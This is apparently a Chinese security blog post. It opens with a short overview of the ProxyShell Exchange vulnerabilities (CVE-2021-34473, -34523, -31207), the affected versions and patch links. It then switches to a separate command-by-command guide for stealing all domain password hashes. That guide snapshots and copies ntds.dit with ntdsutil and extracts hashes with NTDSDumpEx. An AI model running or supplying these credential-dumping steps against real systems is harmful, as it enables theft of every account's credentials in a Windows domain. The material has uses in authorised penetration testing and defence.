## ProxyShell简介

ProxyShell 由三个漏洞组成：

CVE-2021-34473：可导致 ACL 绕过的预认证路径混淆漏洞

CVE-2021-34523：在 Exchange PowerShell 后台的提权漏洞

CVE-2021-31207：可导致 RCE 的认证后任意文件写漏洞

未认证攻击者可利用 ProxyShell 漏洞通过被暴露的端口443在微软 Exchange Server 上执行任意命令。

与3月份微软修复的Proxylogon漏洞相比，ProxyShell不需要知道目标管理员邮箱即可利用，危害性更高。

### 影响范围

Microsoft Exchange Server 2010

Microsoft Exchange Server 2013

Microsoft Exchange Server 2016

Microsoft Exchange Server 2019

### 处置建议

当前微软官方已发布以上漏洞受影响版本的安全补丁，强烈建议受影响的用户尽快安装安全补丁进行防护。

建议受影响用户通过以下链接进行手动更新：

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523

https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207

### 获取域控内所有hash

先导出ntds.dit中的内容【在域控服务器上操作】

文件路径c:\\windows\\ntds\\ntds.dit

*   创建快照

```
ntdsutil snapshot "activate instance ntds"
 create quit quit
```

![](../Images/827898476f85140d8bcae303e2127208.png)

*   挂载快照

```
ntdsutil snapshot "mount {8b40c128-b348-4443-8197-fac604449900}"
 quit quit
```

![](../Images/e6fdff577c420603cd4feca05a5efe20.png)

*   复制ntds.dit文件

```
copy C:\$SNAP_202109032304_VOLUMEC
$\windows\NTDS\ntds.dit ntds.dit
```

![](../Images/83a44ae91e1950ccd253237b019ac3db.png)

*   卸载快照

```
ntdsutil snapshot "unmount {8b40c128-b348-4443-8197-fac604449900}"
 quit quit
```

![](../Images/5026b0aa865bbd5255aff02dbc653f12.png)

*   删除快照

```
ntdsutil snapshot "delete {8b40c128-b348-4443-8197-fac604449900}"
 quit quit
```

![](../Images/770f6236d9331fad55eadfad1ac21682.png)

最后利用`NTDSDumpEx`工具进行内容提取，将`ntds.dit`和`NTDSDumpEx`放在目前机器同一个文件夹下执行

https://github.com/zcgonvh/NTDSDumpEx/releases

如果在能获取`system.hiv`文件的情况下，就执行以下步骤

```

NTDSDumpEx.exe -d ntds.dit -s system.hiv -o xiaoshengguanchashi.txt -h -m -p
```

如果不能获取`system.hiv`文件的情况下，执行如下步骤

*   获取当前系统的SYSKEY

```

NTDSDumpEx.exe -r
```

![](../Images/d498ef70a045d824a2781810998cdaa0.png)

*   利用SYSKEY获取hash信息

```

NTDSDumpEx.exe -d ntds.dit -k 1026DD36333AEE8B3E593A5502A7967C -o xiaoshengguanchashi.txt -h -m -p
```

![](../Images/8b0119a4f96e3323c2e9b466b2647789.png)

将生成的`xiaoshengguanchashi.txt`下载到本地打开即可看到所有的hash信息

![](../Images/b2836d3156161a2233d63925955874ac.png)
